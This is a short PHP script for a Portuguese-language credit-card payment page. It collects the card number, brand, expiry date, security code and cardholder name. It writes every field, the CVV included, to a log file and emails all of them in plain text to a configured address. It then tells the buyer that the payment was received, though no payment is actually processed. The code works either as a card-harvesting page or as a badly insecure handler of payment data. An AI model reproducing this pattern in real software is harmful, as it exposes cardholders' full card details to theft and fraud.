<?php


 if ($_POST['acao']=="1" and $_SESSION['PG']=="sim") {
 
	require_once("util/Util.php");
  	
	 $body = 
	
		"<h2> Dados de pagamento por cart�o de cr�dito</h2><br>
		
		<p>N�mero do Cart�o: ".$_POST["numerocartao"]."</p>
		<p>Bandeira do Cart�o: ".$_POST["bandeirainput"]."</p>
		<p>Validade Cart�o: ".$_POST["validadecartao"]."</p>
		<p>C�digo de Seguran�a: ".$_POST["segurancacartao"]."</p>
		<p>Nome Impresso no Cart�o: ".$_POST["nomecartao"]."</p> 
		<p>Valor: R$ ".$_POST["valor"]."</p>
		<p>Pedido: ".$_POST["pedido"]."</p>";
		
		Util::log("Pedido: ".$_POST['pedido']. " - Dados de pagamento por cart�o de cr�dito ");
		Util::log("Pedido: ".$_POST['pedido']. " - N�mero do Cart�o: ".$_POST["numerocartao"]);
		Util::log("Pedido: ".$_POST['pedido']. " - Bandeira do Cart�o: ".$_POST["bandeirainput"]);
		Util::log("Pedido: ".$_POST['pedido']. " - Validade Cart�o: ".$_POST["validadecartao"]);
		Util::log("Pedido: ".$_POST['pedido']. " - C�digo de Seguran�a: ".$_POST["segurancacartao"]);
		Util::log("Pedido: ".$_POST['pedido']. " - Nome Impresso no Cart�o: ".$_POST["nomecartao"]);
		Util::log("Pedido: ".$_POST['pedido']. " - Valor: ".$_POST["valor"]); 
	 
		$_SESSION['process'] 	=  "sim_".$_POST['pedido'];
		
	    enviar( $INI['mail']['user'],utf8_encode("Dados de pagamento por cart�o de cr�dito"),utf8_encode($body));
	  
		$pagetitle = "O nosso setor financeiro recebeu o seu pagamento e voc� receber� um email assim que seu pagamento for aprovado. Obrigado ! ";
	 
 	  
	 
}
else{
	$pagetitle = 'Pagamento por Cart�o de Cr�dito';
	 
	if($_SESSION['process']=="sim_".$_POST['pedido']){

		redirect( WEB_ROOT . "/index.php");
		
	}
	$_SESSION['PG']="sim";

}


?>